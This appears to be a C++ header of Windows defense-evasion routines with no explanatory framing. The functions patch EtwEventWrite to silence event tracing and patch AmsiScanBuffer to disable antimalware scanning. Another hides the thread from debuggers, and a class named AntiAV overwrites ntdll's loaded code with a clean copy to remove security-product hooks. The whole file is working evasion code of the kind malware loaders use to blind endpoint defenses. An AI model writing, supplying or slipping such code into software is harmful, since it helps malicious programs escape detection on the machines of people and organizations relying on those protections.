#pragma once
#include <windows.h>
#include <winternl.h>
#include <string>
#include <vector>

namespace ETWBlocker {
    __forceinline bool patch_etw() {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll) return false;
        uint8_t* etw = reinterpret_cast<uint8_t*>(GetProcAddress(ntdll, "EtwEventWrite"));
        if (!etw) return false;
        DWORD old;
        if (!VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old)) return false;
        *etw = 0xC3;
        VirtualProtect(etw, 1, old, &old);
        return true;
    }
}

namespace AMSIBlocker {
    __forceinline bool full_amsi_bypass() {
        HMODULE amsi = LoadLibraryW(L"amsi.dll");
        if (!amsi) return true;
        uint8_t* scan = reinterpret_cast<uint8_t*>(GetProcAddress(amsi, "AmsiScanBuffer"));
        if (!scan) { FreeLibrary(amsi); return false; }
        uint8_t patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
        DWORD old;
        if (!VirtualProtect(scan, sizeof(patch), PAGE_EXECUTE_READWRITE, &old)) {
            FreeLibrary(amsi); return false;
        }
        memcpy(scan, patch, sizeof(patch));
        VirtualProtect(scan, sizeof(patch), old, &old);
        return true;
    }
}

namespace ThreadHider {
    __forceinline bool hide_thread(HANDLE thread = GetCurrentThread()) {
        constexpr ULONG ThreadHideFromDebugger = 0x11;
        using NtSetInformationThread_t = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG);
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll) return false;
        auto ntSetInfo = reinterpret_cast<NtSetInformationThread_t>(
            GetProcAddress(ntdll, "NtSetInformationThread"));
        if (!ntSetInfo) return false;
        return NT_SUCCESS(ntSetInfo(thread, ThreadHideFromDebugger, nullptr, 0));
    }
}

class AntiAV {
public:
    static bool unhook_ntdll() {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll) return false;
        wchar_t sysPath[MAX_PATH];
        if (!GetSystemDirectoryW(sysPath, MAX_PATH)) return false;
        std::wstring path = std::wstring(sysPath) + L"\\ntdll.dll";
        HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) return false;
        HANDLE hMap = CreateFileMappingW(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
        if (!hMap) { CloseHandle(hFile); return false; }
        LPVOID view = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
        if (!view) { CloseHandle(hMap); CloseHandle(hFile); return false; }
        auto* dos = (PIMAGE_DOS_HEADER)view;
        auto* nt = (PIMAGE_NT_HEADERS)((uint8_t*)view + dos->e_lfanew);
        PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            if (memcmp(sec[i].Name, ".text", 5) == 0) {
                uint8_t* target = (uint8_t*)ntdll + sec[i].VirtualAddress;
                SIZE_T sz = sec[i].Misc.VirtualSize;
                DWORD old;
                VirtualProtect(target, sz, PAGE_EXECUTE_READWRITE, &old);
                memcpy(target, (uint8_t*)view + sec[i].VirtualAddress, sz);
                VirtualProtect(target, sz, old, &old);
                break;
            }
        }
        UnmapViewOfFile(view);
        CloseHandle(hMap);
        CloseHandle(hFile);
        return true;
    }
};